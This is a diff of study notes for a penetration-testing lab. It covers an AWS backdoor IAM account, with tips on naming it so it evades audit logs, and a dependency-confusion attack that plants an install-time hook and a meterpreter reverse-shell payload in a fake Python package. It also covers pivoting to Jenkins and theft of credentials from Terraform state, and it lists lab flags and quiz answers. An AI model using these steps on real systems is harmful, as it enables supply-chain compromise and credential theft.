-### 26.6. Compromising the Environment via Backdoor Account
+## 26.6 Compromising the Environment via Backdoor Account (Scenario 1)
 
-#### 26.6.1. Discovering Access Level
+### 26.6.1 Discovering What We Have Access To
 
+Configure the stolen Jenkins credentials:
 ```bash
 aws configure --profile=CompromisedJenkins
-# Enter AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY from env
+# Enter: AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, region: us-east-1
 
 aws --profile CompromisedJenkins sts get-caller-identity
-# UserId, Account ID, Arn: ...user/system/jenkins-admin
-
-# Three policy attachment types to check:
-aws --profile CompromisedJenkins iam list-user-policies --user-name jenkins-admin
-# PolicyNames: ["jenkins-admin-role"]   (inline policy)
-
-aws --profile CompromisedJenkins iam list-attached-user-policies --user-name jenkins-admin
-# AttachedPolicies: []
-
-aws --profile CompromisedJenkins iam list-groups-for-user --user-name jenkins-admin
-# Groups: []
-
-aws --profile CompromisedJenkins iam get-user-policy --user-name jenkins-admin --policy-name jenkins-admin-role
-# Effect: Allow, Action: *, Resource: * = full administrator
+# → Arn: arn:aws:iam::<account>:user/system/jenkins-admin
 ```
 
-#### 26.6.2. Creating a Backdoor Account
+Check all three policy attachment paths:
+```bash
+aws --profile CompromisedJenkins iam list-user-policies --user-name jenkins-admin
+# → "jenkins-admin-role" (inline policy)
+
+aws --profile CompromisedJenkins iam list-attached-user-policies --user-name jenkins-admin
+# → [] (nothing)
+
+aws --profile CompromisedJenkins iam list-groups-for-user --user-name jenkins-admin
+# → [] (no groups)
+
+# Read the inline policy
+aws --profile CompromisedJenkins iam get-user-policy \
+  --user-name jenkins-admin --policy-name jenkins-admin-role
+# → "Action": "*", "Resource": "*" ← FULL ADMIN
+```
+
+### 26.6.2 Creating a Backdoor Account
 
 ```bash
 # Create user
 aws --profile CompromisedJenkins iam create-user --user-name backdoor
 
-# Attach AdministratorAccess (AWS managed policy)
+# Attach admin policy
 aws --profile CompromisedJenkins iam attach-user-policy \
   --user-name backdoor \
   --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
 
-# Generate access keys
+# Create access key
 aws --profile CompromisedJenkins iam create-access-key --user-name backdoor
-# Note: AccessKeyId and SecretAccessKey from output
+# → AccessKeyId, SecretAccessKey
 
-# Configure profile with new keys
+# Configure and confirm
 aws configure --profile=backdoor
-
-# Verify
 aws --profile backdoor iam list-attached-user-policies --user-name backdoor
-# Confirms: AdministratorAccess attached
+# → AdministratorAccess confirmed
 ```
 
-> 🔍 Worth remembering generally: In a real engagement, use a realistic username: `terraform-admin`, `deploy-service`, `ci-bot`. The username `backdoor` will stand out in any CloudTrail audit log immediately.
+> 🔍 Worth remembering generally: In real engagements, name the backdoor account something innocuous (terraform-admin, infra-rotate, deploy-svc). "backdoor" gets flagged immediately if anyone reads IAM logs. The account should look like it belongs.
 
-> 🔁 Similar to: [[Enumerating AWS Cloud Infrastructure#25.5. Post-Compromise Enumeration|Module 25 IAM privilege escalation]], same `iam:CreateAccessKey` on `Resource: *` vector
+> 🔁 Similar to: [[Active Directory Enumeration and Enumeration#22.4 Attacks#GenericAll|GenericAll ACE to create backdoor admin]] — same concept, cloud layer instead of AD
 
-> 🚩 Hands-on, VM spin-up required: Find the flag in an EC2 instance tag using the compromised AWS credentials (`aws ec2 describe-instances --profile CompromisedJenkins` and check Tags). ✅ Done
+> 📸 Screenshot: list-attached-user-policies showing AdministratorAccess on backdoor user
 
-```bash
-aws --profile CompromisedJenkins iam get-user-policy --user-name jenkins-admin --policy-name jenkins-admin-role
-# Action: *, Resource: * — full administrator
-
-aws --profile CompromisedJenkins ec2 describe-instances \
-  --query "Reservations[*].Instances[*].Tags" --output json
-# Key: "Flag", Value: OS{35186d1f9cf776149d170e607608186969f7519b}
-# on instance named "CI/CD Infra"
-```
+> 🚩 Hands-on, VM spin-up required: Discover the flag in the EC2 instance tag (Scenario 1). ⬜ Pending
 
 ---
 
-## Part 2: Dependency Chain Abuse
+## 26.7-26.8 Dependency Chain Abuse: Information Gathering (Scenario 2)
 
-### 26.7. Lab Design
+### 26.8.1 Enumerating the Services
 
-Separate lab environment from Part 1. Same DNS setup procedure (new IP on each restart).
+Target app at `app.offseclab.io` is **HackShort** — a Python URL shortener. Two things stand out during enumeration:
 
-Additional setup: configure pip to use the lab's private PyPI server.
+1. Dev Tools → Network tab → Response headers show `Server: Werkzeug/1.0.1 Python/3.11.2` behind two Caddy proxies — confirms Python app
+2. API docs at the `/docs` link show a token-generation endpoint — worth noting but not the primary attack vector
 
-```bash
-mkdir -p ~/.config/pip/
-nano ~/.config/pip/pip.conf
-```
+> 🚩 Hands-on, VM spin-up required: Discover the hidden HTTP path on app.offseclab.io (returns a flag). Discover the flag in the HTML source of app.offseclab.io. ⬜ Pending
 
-`pip.conf` contents:
-```ini
-[global]
-index-url = http://pypi.offseclab.io
-trusted-host = pypi.offseclab.io
-```
+### 26.8.2 Conducting Open Source Intelligence
 
-This replaces the default PyPI index for the duration of the lab. Apply the same config to the cloud Kali instance over SSH.
+Search for "hackshort" on developer forums/issue trackers. Find a forum post from a developer that reveals:
+- Internal package name: `hackshort-util`
+- Version constraint in requirements.txt: `hackshort-util~=1.1.0`
+- Import line in app code: `from hackshort_util import utils`
 
-**Cleanup (at lab end, in addition to DNS reset):**
-```bash
-rm ~/.pypirc
-rm ~/.config/pip/pip.conf
-# Also reset Firefox SOCKS proxy to "No proxy" in Settings
-```
-
----
-
-### 26.8. Information Gathering
-
-#### 26.8.1. Enumerating the Services
-
-Visit `app.offseclab.io`: "HackShort" URL shortener with an API. Open Developer Tools → Network tab → refresh page → inspect the first request headers:
-- Two `Server: Caddy` headers (two reverse proxies)
-- One `Server: Werkzeug/1.0.1 Python/3.11.2` header (Python/Flask backend)
-
-> 🚩 Hands-on, VM spin-up required: Find the hidden HTTP path on `app.offseclab.io` that returns a flag when visited. ✅ Done
-
-Flask returns 302 (not 404) for non-existent paths, exclude the wildcard length:
-```bash
-gobuster dir -u http://app.offseclab.io \
-  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
-  -b 403,404 --exclude-length 237 -t 50
-# /admin  (Status: 200) [Size: 44]
-curl http://app.offseclab.io/admin
-# OS{687a2c7ebb7514cf6065fbe0bc6c84b08b51f999}
-```
-
-> 🚩 Hands-on, VM spin-up required: Find the flag in the HTML source of `app.offseclab.io`. ✅ Done
-
-Flag was in an HTML comment inside `/api_doc`, not the main page:
-```bash
-curl -s http://app.offseclab.io/api_doc | grep -i 'OS{'
-# <!-- OS{64a96572fcd6de8bc208284c76f722725d707cab}  //-->
-```
-
-#### 26.8.2. Conducting OSINT
-
-Simulated forum post reveals (treat as OSINT finding):
-- The app uses a private package: `hackshort-util~=1.1.0` in requirements.txt
-- Import pattern: `from hackshort_util import utils`
-- Package not on any public repo
-
+Check if the package is in the private PyPI:
 ```bash
 pip download hackshort-util
-# ERROR: No matching distribution found
+# "Could not find a version that satisfies the requirement hackshort-util"
+# → Package is ABSENT from public index = Dependency Chain Abuse window is open
 ```
 
-Not on the lab's pypi.offseclab.io either. This makes it a dependency chain attack target.
+**Attack vector confirmed:** Dependency Confusion (CICD-SEC-3). Publish `hackshort-util` at version `1.1.4` (satisfies `~=1.1.0` which allows `1.1.x` but not `1.2.0`+).
+
+> 🔍 Worth remembering generally: Version specifier `~=1.1.0` is the "compatible release" clause. It's equivalent to `>=1.1.0, ==1.1.*` — so 1.1.1, 1.1.4, 1.1.99 all satisfy it, but 1.2.0 does not. Publishing at `1.1.4` > `1.1.3` (the internal version) without going past the ceiling is the sweet spot.
+
+pip version specifier reference:
+| Specifier | Meaning | Example |
+|---|---|---|
+| `==` | Exact match (wildcards ok) | `==1.0.*` |
+| `~=` | Compatible release | `~=1.1.0` → any 1.1.x |
+| `>=` | Greater than or equal | `>=1.1.0` |
+| `<=` | Less than or equal | `<=2.0.0` |
+
+Quiz answers:
+- Q: Which config makes pip vulnerable to dependency chain attack? → **extra-index-url** (multiple indexes searched → highest version wins across all of them)
+- Q: Which satisfies `hackshort-util==2.*`? → **A) 2.0.1**
+- Q: What does `~=` mean? → **D) Versions compatible with the specified version**
+- Q: Why underscores instead of dashes? → **B) Dashes cause issues in Python syntax**
+
+- [PayloadsAllTheThings — Supply Chain / Dependency Confusion](https://github.com/swisskyrepo/PayloadsAllTheThings)
+- [HackTricks — Dependency Chain Abuse (GitHub)](https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-cicd/dependency-chain-abuse.md)
 
 ---
 
-### 26.9. Dependency Chain Attack
+## 26.9 Dependency Chain Attack (Scenario 2)
 
-#### 26.9.1. Understanding the Attack
+### 26.9.1 Understanding the Attack
 
-**pip's two index configurations:**
+The production app imports `hackshort_util.utils` on startup. We:
+1. Create a malicious `hackshort-util` Python package
+2. Embed a meterpreter payload in `hackshort_util/utils.py`
+3. Publish it to `pypi.offseclab.io` at version `1.1.4` (higher than installed `1.1.3`)
+4. Wait up to 10 minutes for production to rebuild and install it
+5. Catch the meterpreter session on cloud Kali
 
-| Setting | Behaviour |
-|---------|-----------|
-| `index-url` | Replaces default PyPI. Only this index searched. No dependency confusion possible. |
-| `extra-index-url` | ADDS indexes alongside default PyPI. Both searched. Highest version wins. Vulnerable. |
+### 26.9.2 Creating the Malicious Package
 
-**The attack:** if the developer uses `extra-index-url` to add a private registry, publish the same package name to the public index with a higher version. pip downloads yours instead.
-
-**Version specifiers:**
-
-| Specifier | Example | What matches |
-|-----------|---------|-------------|
-| `==` | `pkg==1.0.0` | Exact version only (`==1.0.*` for wildcard) |
-| `<=` | `pkg<=1.0.0` | 1.0.0 or lower |
-| `>=` | `pkg>=1.0.0` | 1.0.0 or higher |
-| `~=` | `pkg~=1.1.0` | Compatible: 1.1.x only, not 1.2.0 |
-
-For `hackshort-util~=1.1.0`: any version from 1.1.1 to 1.1.9 works. Use `1.1.4`.
-
-Dash vs underscore: pip/PyPI package name = `hackshort-util` (dash allowed). Python import = `hackshort_util` (underscore, dash is invalid syntax).
-
-**Quiz answers (pure recall):**
-- Q1: `extra-index-url (it adds additional indexes to search alongside the default public PyPI, and highest version wins)`
-- Q2: `A. 2.0.1 (satisfies hackshort-util==2.*; 3.4b fails because 3.x, 22.0 fails because 22.x)`
-- Q3: `D. Versions that are compatible with the specified version can be used`
-- Q4: `B. Dashes cause issues in Python syntax`
-
-#### 26.9.2. Creating the Malicious Package
-
-Minimum structure:
+Package structure:
 ```
 hackshort-util/
 ├── setup.py
 └── hackshort_util/
-    └── __init__.py
-```
-
-```bash
-mkdir hackshort-util && cd hackshort-util
-mkdir hackshort_util
-touch hackshort_util/__init__.py
+    ├── __init__.py    (empty — marks directory as Python module)
+    └── utils.py       (the malicious payload file)
 ```
 
 `setup.py`:
 ```python
 from setuptools import setup, find_packages
-
-setup(
-    name='hackshort-util',
-    version='1.1.4',         # higher than 1.1.0, within ~= range
-    packages=find_packages(),
-    classifiers=[],
-    install_requires=[],
-    tests_require=[],
-)
-```
-
-Build and test:
-```bash
-python3 ./setup.py sdist
-pip install ./dist/hackshort_util-1.1.4.tar.gz
-python3 -c "import hackshort_util; print(hackshort_util)"
-pip uninstall hackshort-util
-```
-
-#### 26.9.3. Command Execution During Install
-
-Add a custom `cmdclass` to `setup.py`. The `Installer.run()` fires at `pip install` time (build time in a pipeline):
-
-```python
-from setuptools import setup, find_packages
-from setuptools.command.install import install
-
-class Installer(install):
-    def run(self):
-        install.run(self)       # continue normal install
-        # payload: reverse shell, file write, etc.
-        with open('/tmp/running_during_install', 'w') as f:
-            f.write('executed during install')
-
 setup(
     name='hackshort-util',
     version='1.1.4',
     packages=find_packages(),
     classifiers=[],
     install_requires=[],
-    tests_require=[],
+)
+```
+
+### 26.9.3 Command Execution During Install
+
+Adding a `cmdclass` to `setup.py` runs code at install time (build-server RCE, not production). Used here to prove concept and get the builder flag:
+
+```python
+from setuptools.command.install import install
+
+class Installer(install):
+    def run(self):
+        install.run(self)
+        # malicious code here — runs on builder when pip install executes
+
+setup(
+    ...
     cmdclass={'install': Installer}
 )
 ```
 
-Test: rebuild, install, verify file was created.
+> 📸 Screenshot: /proof.txt read from builder server via setup.py payload
 
-#### 26.9.4. Command Execution During Runtime
+Lab answer: `OS{d2e2d663cfa58fd337aaea80d805c8e70bac434d}` (builder /proof.txt via setup.py)
 
-Create `hackshort_util/utils.py`. This fires when the application imports the module.
+### 26.9.4 Command Execution During Runtime
 
-Two problems to solve:
-1. The app calls functions that don't exist in our utils, need a wildcard catcher
-2. If we return the wrong type, the app throws an exception and may crash, need to suppress it
+Create `hackshort_util/utils.py` with:
+1. `__getattr__` wildcard so any function call on the module silently succeeds
+2. `sys.excepthook` replacement to catch exceptions and loop forever (keeps process alive when our payload breaks the expected return values)
+3. The meterpreter exec line at the bottom — runs on module import
 
 ```python
 import time
 import sys
 
 def standardFunction():
-    pass
+        pass
 
 def __getattr__(name):
-    # module-level __getattr__: called for any unknown attribute name
-    pass
-    return standardFunction
+        pass
+        return standardFunction
 
 def catch_exception(exc_type, exc_value, tb):
-    # replaces the default crash handler with an infinite sleep
     while True:
         time.sleep(1000)
 
 sys.excepthook = catch_exception
+
+# meterpreter exec line goes here (added in 26.9.5)
 ```
 
-`__getattr__` at the module level is called when an attribute name isn't found. Returning `standardFunction` (which does nothing) handles any function call without erroring.
+### 26.9.5 Adding the Payload
 
-`sys.excepthook` replaces Python's default crash handler. If the app throws an uncaught exception (because our return type is wrong), it sleeps forever instead of printing a traceback and exiting, buying time to enumerate.
+Generate on cloud Kali (LHOST must be cloud Kali's public IP — production container is in AWS and can't reach your local 10.x.x.x):
 
-#### 26.9.5. Adding a Payload
-
-Generate Python meterpreter on personal Kali:
 ```bash
-msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=<CLOUD_KALI_IP> LPORT=4488
+msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=<cloud-kali-public-ip> LPORT=4488
+# Outputs: exec(__import__('zlib').decompress(...))
 ```
 
-Append the output to `hackshort_util/utils.py`:
-```python
-# ... (standardFunction, __getattr__, catch_exception, sys.excepthook as above)
+Paste the exec() line at the end of `utils.py`.
 
-exec(__import__('zlib').decompress(...))   # paste msfvenom output here
+Start the handler on cloud Kali:
 ```
-
-Start listener on cloud Kali:
-```bash
-ssh kali@<CLOUD_KALI_IP>
-sudo msfdb init
-msfconsole
 use exploit/multi/handler
 set payload python/meterpreter/reverse_tcp
 set LHOST 0.0.0.0
@@ -773,29 +582,36 @@ set ExitOnSession false
 run -jz
 ```
 
-Test locally first (rebuild, install, import in python3, verify session received), then uninstall.
+> 🔧 Technique: `-jz` runs handler as background job without auto-interacting with new sessions. Lets you catch multiple reverse shells cleanly and choose which to interact with.
 
-#### 26.9.6. Publishing the Malicious Package
-
-Configure `~/.pypirc`:
-```ini
-[distutils]
-index-servers = 
-    offseclab 
-
-[offseclab]
-repository: http://pypi.offseclab.io/
-username: student
-password: password
+Test the package locally first (import utils on personal Kali → session opens on cloud Kali):
+```python
+# Personal Kali — from home dir
+python3
+>>> from hackshort_util import utils
+# → check cloud Kali msfconsole for session
 ```
 
-Build and upload:
+### 26.9.6 Publishing the Malicious Package
+
 ```bash
+# Build (from hackshort-util/ directory)
 python3 ./setup.py sdist
-twine upload --repository-url http://pypi.offseclab.io/ -u student -p password dist/*
+ls dist/   # confirm only one tarball before uploading
+
+# Upload SPECIFIC filename (NOT dist/* — avoids stale old tarballs)
+~/.local/bin/twine upload \
+  --repository-url http://pypi.offseclab.io/ \
+  -u student -p password \
+  dist/hackshort_util-1.1.4.tar.gz
 ```
 
-If you need to remove and re-upload a bad version:
+Verify upload:
+```bash
+curl -u 'student:password' http://pypi.offseclab.io/hackshort-util/json
+```
+
+Remove a bad version:
 ```bash
 curl -u "student:password" \
   --form ":action=remove_pkg" \
@@ -804,57 +620,80 @@ curl -u "student:password" \
   http://pypi.offseclab.io/
 ```
 
-Production server rebuilds every 10 minutes. Wait for the meterpreter session.
+Production rebuilds every 10 minutes. Wait up to 10 minutes for a session.
 
-**Quiz answers (pure recall):**
-- Q3: `B, The output of the mount command (overlay filesystem confirms Docker)`
-- Q4: `C. ROOT_PASSWORD (not present; actual env vars were SECRET_KEY, ADMIN_PASSWORD, GPG_KEY, ADMIN_USERNAME)`
+> 📸 Screenshot: msfconsole session opened from production container (python/linux, root @ <container_id>)
 
-> 🚩 Hands-on, VM spin-up required: Obtain a meterpreter shell on the production server via dependency chain attack. Read `/proof.txt` for the flag. ⬜ Pending
-
-> 🚩 Hands-on, VM spin-up required: Obtain command execution on the **builder** server by embedding a payload in `setup.py` (install-time execution). Read `/proof.txt` for the flag. ⬜ Pending
+Lab answers:
+- Q1 (production /proof.txt): `OS{623b7cdd332a0038ce6368bd3104b3ee5c04ddfe}`
+- Q2 (builder /proof.txt via setup.py): `OS{d2e2d663cfa58fd337aaea80d805c8e70bac434d}`
+- Q3 (Docker evidence): **B — output of the mount command** (overlay filesystem paths with `/var/lib/docker/overlay2/`)
+- Q4 (NOT a secret in env vars): **C — ROOT_PASSWORD** (env had ADMIN_PASSWORD, SECRET_KEY, GPG_KEY, but not ROOT_PASSWORD)
 
 ---
 
-### 26.10. Compromising the Environment
+## 26.10 Compromising the Environment (Scenario 2)
 
-#### 26.10.1. Enumerating the Production Container
+### 26.10.1 Enumerating the Production Container
 
+```bash
+sessions -i N    # interact with session
 ```
-meterpreter > ifconfig
+
+In meterpreter:
+```
+ifconfig         # meterpreter built-in (not system ifconfig)
 # eth0: 172.18.0.4/16
 # eth1: 172.30.0.3/16
-
-meterpreter > shell
-whoami         # root
-ls -alh        # Python app source, Dockerfile, pip.conf, requirements.txt
-mount          # overlay = Docker
-printenv       # SECRET_KEY, ADMIN_PASSWORD, GPG_KEY, ADMIN_USERNAME, SQLALCHEMY_DATABASE_URI
 ```
 
-SQLite DB path in env: `sqlite:////data/data.db`. Can be read via Python's sqlite3 module from the shell.
+Drop to shell:
+```bash
+shell
+whoami   # root
 
-Sessions will die when the service restarts. When the app restarts, a new meterpreter session opens automatically (the payload is baked into the package).
+# Confirm Docker container
+mount | head -3
+# overlay on / type overlay (rw,...,lowerdir=/var/lib/docker/overlay2/...)
 
-> 🚩 Hands-on, VM spin-up required: Find the environment variable containing the flag in the production container. ⬜ Pending
+# Check environment variables for secrets
+printenv
+# ADMIN_USERNAME=admin, ADMIN_PASSWORD=password, SECRET_KEY=...,
+# GPG_KEY=..., SQLALCHEMY_DATABASE_URI=sqlite:////data/data.db
+```
 
-> 🚩 Hands-on, VM spin-up required: Find the flag in the SQLite database (`/data/data.db`, check the links table). ⬜ Pending
+SQLite database (`sqlite3` binary not in container — use Python):
+```bash
+python3 -c "
+import sqlite3
+c = sqlite3.connect('/data/data.db')
+print([t[0] for t in c.execute(\"SELECT name FROM sqlite_master WHERE type='table'\")])
+# ['url', 'email', 'auth_token', 'verification_code']
+print(c.execute('SELECT * FROM url').fetchall())
+# Contains flag in one of the short URL records
+"
+```
 
-> 🚩 Hands-on, VM spin-up required: Check `/etc/os-release` on the production container to identify the OS. ⬜ Pending
+> 🔧 Technique: `sqlite3` binary is rarely installed in minimal containers. Python's built-in `sqlite3` module does the same job — no install needed.
 
-#### 26.10.2. Scanning the Network
+> 📸 Screenshot: printenv output showing ADMIN_USERNAME, ADMIN_PASSWORD, SECRET_KEY, GPG_KEY
+> 📸 Screenshot: Python sqlite3 SELECT * FROM url output with flag value
 
-No nmap in the container. Write a Python port scanner and upload it via meterpreter.
+Lab answers:
+- Q1 (env var flag): `OS{3d82f76c9854db7203f1d84eb0f8a8ebbeb0cf38}`
+- Q2 (OS from /etc/os-release): `Debian GNU/Linux 11`
+- Q3 (SQLite flag in url table): `OS{4014e3dcc56a9a215a1434e6d2f0eb4c223f6c11}`
 
-`netscan.py` (create on personal Kali, scp to cloud Kali, then upload via meterpreter):
+### 26.10.2 Scanning the Network
+
+No nmap in the container. Upload and run a Python port scanner:
+
 ```python
-import socket
-import ipaddress
-import sys
+# netscan.py (create on personal Kali, scp to cloud Kali, upload via meterpreter)
+import socket, ipaddress, sys
 
 def port_scan(ip_range, ports):
     for ip in ip_range:
-        print(f"Scanning {ip}")
         for port in ports:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(.2)
@@ -868,237 +707,265 @@ ports = [80, 443, 8080]
 port_scan(ip_range, ports)
 ```
 
-Transfer and run:
 ```bash
-# On personal Kali:
-scp ./netscan.py kali@<CLOUD_KALI_IP>:/home/kali/
+# scp to cloud Kali
+scp ./netscan.py kali@<cloud-kali-ip>:/home/kali/
 
-# In meterpreter:
+# Upload to container via meterpreter
 meterpreter > upload /home/kali/netscan.py /netscan.py
+
+# Run from shell
 meterpreter > shell
-python /netscan.py 172.18.0.1/24
-python /netscan.py 172.30.0.1/24
+python3 /netscan.py 172.18.0.1/24
+# Port 80: 172.18.0.1 (gateway), 172.18.0.2 (Caddy), 172.18.0.3 (HIDDEN), 172.18.0.4 (us), 172.18.0.5
+
+python3 /netscan.py 172.30.0.1/24
+# Port 80: 172.30.0.1, 172.30.0.10 (Caddy)
+# Port 8080: 172.30.0.30 (JENKINS), 172.30.0.50, 172.30.0.60
 ```
 
-The script will appear frozen while scanning. Give it a few minutes.
-
-**Key find from 172.30.0.1/24:**
-- `172.30.0.30:8080` — Jenkins (confirmed by curl showing Jenkins login redirect + login page HTML with "create an account" link)
-
-Self-registration open = can create an account and enumerate further without brute forcing.
-
-> 🔍 Worth remembering generally: Private Docker networks often have no firewall rules between containers. Direct access to an internal service lets you bypass any authentication imposed by the internet-facing reverse proxy.
-
-> 🔁 Similar to: [[Port Redirection and SSH Tunneling#Meterpreter Tunneling|MSF autoroute + SOCKS pivot]], same pivot chain pattern
-
-> 🚩 Hands-on, VM spin-up required: Find the hidden HTTP service on port 80 in the internal network (`172.18.0.0/16`) that returns a flag. ⬜ Pending
-
-#### 26.10.3. Loading Jenkins
-
-Full tunnel chain:
-```
-Personal Kali → SSH tunnel → Cloud Kali → MSF SOCKS → Route → 172.30.0.30:8080
+Identify hidden service and Jenkins:
+```bash
+curl 172.18.0.3      # Returns flag directly
+curl 172.30.0.30:8080/login
+# HTML shows Jenkins login with "create an account" link = self-registration enabled
 ```
 
-Steps (run on cloud Kali in MSF, after backgrounding the session):
+> 📸 Screenshot: netscan.py output with open ports on both /24 subnets
 
+Lab answer: `OS{d31c7644699244889078579766a1e5066181e688}` (172.18.0.3 port 80)
+
+### 26.10.3 Tunneling to Jenkins
+
+Chain: Personal Kali → SSH tunnel → Cloud Kali → MSF SOCKS proxy → MSF route → Meterpreter → Jenkins 172.30.0.30:8080
+
+```mermaid
+flowchart LR
+    A[Personal Kali :1080] -->|SSH -L tunnel| B[Cloud Kali :1080]
+    B -->|MSF SOCKS proxy| C[MSF route via session N]
+    C -->|meterpreter| D[Jenkins 172.30.0.30:8080]
 ```
-# Background the session
-meterpreter > background
 
-# Start SOCKS proxy (listen only on localhost, not internet-facing)
+**Step 1** — Exit shell, background session:
+```
+exit
+background
+```
+
+**Step 2** — Start MSF SOCKS proxy (cloud Kali):
+```
 use auxiliary/server/socks_proxy
 set SRVHOST 127.0.0.1
 run -j
-
-# Add route for Jenkins network through the meterpreter session
-route add 172.30.0.1 255.255.0.0 <SESSION_ID>
 ```
 
-Then on personal Kali, create an SSH local forward:
+**Step 3** — Add route through meterpreter session:
+```
+sessions               # get session ID N
+route add 172.30.0.1 255.255.0.0 N
+```
+
+**Step 4** — SSH local port forward (personal Kali):
 ```bash
-ssh -fN -L localhost:1080:localhost:1080 kali@<CLOUD_KALI_IP>
-# -f = background, -N = no command, -L = local forward
-# localhost:1080 on personal Kali → localhost:1080 on cloud Kali
+ssh -fN -L localhost:1080:localhost:1080 kali@<cloud-kali-ip>
+ss -tulpn | grep 1080    # confirm :1080 listening
 ```
 
-Verify the tunnel is up:
-```bash
-ss -tulpn | grep 1080
-# tcp LISTEN 127.0.0.1:1080
+**Step 5** — Firefox SOCKS proxy (personal Kali):
+Settings → Network Settings → Manual proxy → SOCKS Host: `127.0.0.1`, Port: `1080`, SOCKS v5
+
+Browse to `http://172.30.0.30:8080` — Jenkins loads (slowly, through multiple tunnel layers).
+
+> 🔧 Technique: If the meterpreter session dies and a new one opens with a different ID, re-run `route add` with the new session ID. The SOCKS proxy job persists but the route through the dead session is stale.
+
+> 🔁 Similar to: [[Port Redirection and SSH Tunneling#19.3.3 SSH Dynamic Port Forwarding|MSF autoroute + SOCKS + SSH -L chain]]
+
+### 26.10.4 Exploiting Jenkins
+
+Self-registration enabled — create an account, log in. Dashboard shows projects: `hackshort` (the app that gave us our shell) and `company-dir`.
+
+On `company-dir`, the sidebar shows **S3 Explorer**. The S3 Explorer Jenkins plugin has a known vulnerability: AWS credentials appear in page source without masking.
+
+```
+Right-click → View Page Source (Ctrl+U) → Ctrl+F "awsid"
 ```
 
-Configure Firefox: Settings → Network → Manual proxy → SOCKS Host: `127.0.0.1` Port: `1080` → **SOCKS v5** → OK.
-
-Browse to `http://172.30.0.30:8080`. Slow but works.
-
-> 🔁 Similar to: [[Port Redirection and SSH Tunneling#SSH Local Port Forwarding|SSH -L forward]] combined with [[Port Redirection and SSH Tunneling#Meterpreter SOCKS|MSF SOCKS proxy + route add]]
-
-#### 26.10.4. Exploiting Jenkins
-
-Create an account via self-registration. Navigate to Dashboard. Find `company-dir` project. Note the **S3 Explorer** action.
-
-**S3 Explorer plugin vulnerability:** AWS credentials are embedded unmasked in the HTML source as hidden `<input>` fields. No authentication or masking. Anyone with a Jenkins account can read them.
-
-View page source on the S3 Explorer page:
+Page source contains:
 ```html
-<input id="awsid" type="hidden" value="AKIAUBHUBEGIMWGUDSWQ">
-<input id="awskey" type="hidden" value="e7pRWvsGgTyB8UHNXilvCZdC9xZPA8oF3KtUwaJ5">
-<input id="awsregion" type="hidden" value="us-east-1">
-<input id="bucket" type="hidden" value="company-directory-<SUFFIX>">
+<input id="awsid" type="hidden" value="AKIA...">
+<input id="awskey" type="hidden" value="...">
+<input id="bucket" type="hidden" value="company-directory-...">
 ```
 
-Configure profile:
+> 📸 Screenshot: Jenkins dashboard showing company-dir with S3 Explorer in sidebar
+> 📸 Screenshot: Page source with awsid/awskey hidden input fields highlighted
+
+- [HackTricks — Jenkins Exploitation (GitHub)](https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-cicd/jenkins/)
+- [ippsec.rocks — search "jenkins"](https://ippsec.rocks/?#jenkins) → Jeeves (HTB) gets RCE via script console; same post-auth enumeration mentality
+
+Lab answers:
+- Q1 (S3 bucket flag): `OS{7e9930aed669c1a4348215b40bf9db523bd70da2}` (in `secretFile` object in company-directory bucket)
+- Q2 (first step exploiting Jenkins): **B — Creating a user account for enumeration**
+- Q3 (plugin with vulnerability): **C — S3 Explorer**
+
+### 26.10.5 Enumerating with Discovered Credentials
+
 ```bash
 aws configure --profile=stolen-s3
-# enter the id and key from above
+# Enter awsid, awskey, us-east-1
 
 aws --profile=stolen-s3 sts get-caller-identity
-# user: s3_explorer
+# user = s3_explorer (limited account purpose-built for S3)
 
+aws --profile=stolen-s3 s3 ls company-directory-<suffix>
+# Alen.I.vcf, Goran.B.vcf, Zeljko.B.vcf, secretFile
+
+aws --profile=stolen-s3 s3 cp s3://company-directory-<suffix>/secretFile -
+# Flag output
+
+# List ALL buckets (s3api, not s3 ls)
 aws --profile=stolen-s3 s3api list-buckets
-# Finds: company-directory-<SUFFIX>, tf-state-<SUFFIX>
+# company-directory-<suffix> AND tf-state-<suffix>
 ```
 
-**Quiz answers (pure recall):**
-- Q2: `B, Creating a user account for enumeration (self-registration was open)`
-- Q3: `C. S3 Explorer`
+"tf-state" = Terraform state bucket. Terraform state files store the full applied infrastructure config — including generated secrets and credentials — in plaintext.
 
-> 🚩 Hands-on, VM spin-up required: Find the flag in one of the S3 buckets accessible with the `stolen-s3` credentials. ⬜ Pending
-
-#### 26.10.5-6. Escalating to Admin via Terraform State
+### 26.10.6 Discovering the State File and Escalating to Admin
 
 ```bash
-# List the Terraform state bucket
-aws --profile=stolen-s3 s3 ls tf-state-<SUFFIX>
+# List state bucket
+aws --profile=stolen-s3 s3 ls tf-state-<suffix>
 # terraform.tfstate
 
-# Download it
-aws --profile=stolen-s3 s3 cp s3://tf-state-<SUFFIX>/terraform.tfstate ./
-cat terraform.tfstate
+# Download
+aws --profile=stolen-s3 s3 cp s3://tf-state-<suffix>/terraform.tfstate ./
 ```
 
-State file contains:
-- `user_list`: three users with policy ARNs (Goran.B = AdministratorAccess, others = ReadOnlyAccess)
-- `resources`: access key IDs and secrets for each user in plaintext
+State file reveals user list with policies and IAM credentials:
+```bash
+grep -A20 '"index_key": "Goran.B"' terraform.tfstate
+# id: AKIA...  (admin user's access key)
+# secret: ...
 
-Configure Goran.B's profile:
+grep -B2 -A2 "AdministratorAccess" terraform.tfstate
+# Goran.B = AdministratorAccess
+```
+
+Configure admin and confirm:
 ```bash
 aws configure --profile=goran.b
-# enter ID and secret from state file
+# Enter Goran.B's id and secret, us-east-1
 
 aws --profile=goran.b iam list-attached-user-policies --user-name goran.b
-# AdministratorAccess confirmed = full compromise
+# → AdministratorAccess confirmed
+
+# Find EC2 tag flag
+aws --profile=goran.b ec2 describe-instances \
+  --query 'Reservations[].Instances[].Tags' --output json
 ```
 
-> 🔍 Worth remembering generally: Terraform state files are plaintext JSON containing every resource attribute, including secrets, access keys, and passwords for anything Terraform provisioned. Writable or public S3 buckets storing state files are a critical finding in any cloud assessment.
+> 📸 Screenshot: terraform.tfstate showing user_list and resources with access keys
+> 📸 Screenshot: ec2 describe-instances output with flag in Tags array
 
-**Quiz answers (pure recall):**
-- Q1: `C. List and read permissions`
